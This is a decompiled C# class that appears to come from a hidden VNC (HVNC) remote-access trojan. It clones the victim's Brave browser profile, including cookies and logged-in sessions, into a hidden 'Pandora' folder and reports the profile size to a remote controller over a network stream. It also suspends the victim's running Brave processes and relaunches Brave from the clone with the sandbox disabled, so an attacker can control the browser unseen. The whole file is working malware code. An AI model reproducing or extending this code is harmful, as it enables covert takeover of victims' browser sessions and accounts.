using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using DLL.Functions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace DLL.Browser
{
	// Token: 0x02000008 RID: 8
	public class Brave
	{
		// Token: 0x06000055 RID: 85
		[DllImport("user32.dll")]
		public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

		// Token: 0x06000056 RID: 86 RVA: 0x00004DA4 File Offset: 0x00002FA4
		public static void StartBrave(bool duplicate)
		{
			try
			{
				if (Conversions.ToBoolean(Outils.IsFileOpen(new FileInfo(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\Pandora\\lockfile"))))
				{
					Outils.SendInformation(Outils.nstream, "25|Brave has already been opened!");
				}
				else
				{
					if (duplicate)
					{
						try
						{
							Outils.a.FileSystem.CopyDirectory(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\User Data", Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\Pandora\\", true);
						}
						catch (Exception ex)
						{
						}
						Outils.SendInformation(Outils.nstream, "206|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\User Data") / 1024.0 / 1024.0)));
					}
					else
					{
						Outils.SendInformation(Outils.nstream, "207|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\User Data") / 1024.0 / 1024.0)));
					}
					Process[] processesByName = Process.GetProcessesByName("brave");
					for (int i = 0; i < processesByName.Length; i++)
					{
						Outils.SuspendProcess(processesByName[i]);
					}
					Process.Start("brave", "--user-data-dir=\"" + Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\Pandora\" --no-sandbox --allow-no-sandbox-job --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio").WaitForInputIdle();
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					while (Outils.FindHandle("Welcome to HVNC !") == (IntPtr)0)
					{
						Rectangle workingArea = Screen.AllScreens[0].WorkingArea;
						Brave.SetWindowPos(Outils.FindHandle("Welcome to HVNC !"), 0, workingArea.Left, workingArea.Top, workingArea.Width, workingArea.Height, 68);
						Application.DoEvents();
						if (stopwatch.ElapsedMilliseconds >= 10000L)
						{
							return;
						}
					}
					stopwatch.Stop();
					processesByName = Process.GetProcessesByName("brave");
					for (int i = 0; i < processesByName.Length; i++)
					{
						Outils.ResumeProcess(processesByName[i]);
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x0400003D RID: 61
		private const short SWP_NOMOVE = 2;

		// Token: 0x0400003E RID: 62
		private const short SWP_NOSIZE = 1;

		// Token: 0x0400003F RID: 63
		private const short SWP_NOZORDER = 4;

		// Token: 0x04000040 RID: 64
		private const int SWP_SHOWWINDOW = 64;
	}
}
